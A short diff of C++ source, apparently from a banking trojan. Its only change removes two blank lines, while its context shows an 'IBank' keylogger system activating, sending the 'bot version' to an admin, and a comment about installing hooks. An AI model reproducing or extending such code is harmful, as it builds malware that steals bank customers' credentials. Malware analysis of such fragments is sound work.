@@ -255,7 +255,6 @@ namespace IBank
 	void SystemActivated(LPVOID Sender)
 	{
 		System = (PKeyLogSystem)Sender;
-
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
 
@@ -274,7 +273,6 @@ namespace IBank
 			if (Temp != NULL)
             	Log.Wnd = Temp;
         }
-
 		//отсылаем версию бота (для патча)
 		SendLogToAdmin( "botver", versionPatch );
 		//  Ставим хуки
